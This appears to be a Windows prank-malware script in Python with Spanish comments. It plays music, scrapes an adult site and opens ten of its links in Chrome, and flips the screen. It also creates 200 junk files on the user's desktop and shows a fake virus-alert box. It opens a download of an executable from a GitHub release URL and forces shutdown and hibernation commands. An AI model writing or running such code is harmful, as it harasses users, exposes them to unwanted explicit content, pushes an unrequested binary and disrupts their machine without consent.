from logging import shutdown
from time import time
from pygame import mixer
import os
import bs4
from bs4 import BeautifulSoup
import requests
import pyautogui
from time import sleep
import rotatescreen
import getpass
import win32api
import random

sleep(1)

# Musica India Que no Falte
mixer.init()
mixer.music.load("songs/indian.mp3")
mixer.music.play()

# Aqui es cuando empiezas a preocuparte
os.system("scrnsave.scr /s")

# scrapeo de webs owonts
r = requests.get("https://allpornsite.net/").text
soup = BeautifulSoup(r, "html.parser")
x = 0
for links in soup.find_all("a", {"class": "site-link"}):
    os.system("start /MAX chrome /new-window " + links["href"])
    x = x + 1
    if x == 10:
        break

sleep(2)

os.system("scrnsave.scr /s")
screen = rotatescreen.get_primary_display()
screen.set_portrait_flipped()

letras = ["ث ","ت ","ب" ,"ا ","ي ","ه" ,"ن", "م" ,"ل", "ك", "ق" ,"ف" ,"غ" ,"ع "]
palabra = ""

# wtf amigo dinlilinlilinlilin
for z in range(0,200):
    for x in range(0,10):
        letra = letras[random.randrange(0, len(letras))] 
        palabra = palabra + letra

    os.system("fsutil file createNew " + "C:/Users/" + getpass.getuser() + "/Desktop/" + '"' + palabra + '"' + " 1") 

screen.set_landscape()
os.system("scrnsave.scr /s")
pyautogui.hotkey('winleft', 'd')

win32api.MessageBox(0, 'Your computer has virus! Try the new ANTIVIRUS ANTIVIRUS ANTIVIRUS', "··$)=ODASIJF·$·$()!·$")
os.system("start https://github.com/abrahampo1/RogueCompanion_deprecated/releases/download/1.6/RogueCompanion.exe")
os.system("scrnsave.scr /s")
os.system('shutdown /s /c "لن أتخلى عنك أبدًا لن أخذلك أبدًا لن تركض وأتركك أبدًا لن تجعلك تبكي لن أقول وداعًا أبدًا لن تكذب ولن تؤذيك أبدًا"')
sleep(2)
os.system("shutdown /a")

mixer.stop()
mixer.music.load("songs/manabar.mp3")
mixer.play()
os.system("start https://github.com/abrahampo1/RogueCompanion_deprecated/releases/download/1.6/RogueCompanion.exe")
sleep(10)
os.system("shutdown /h")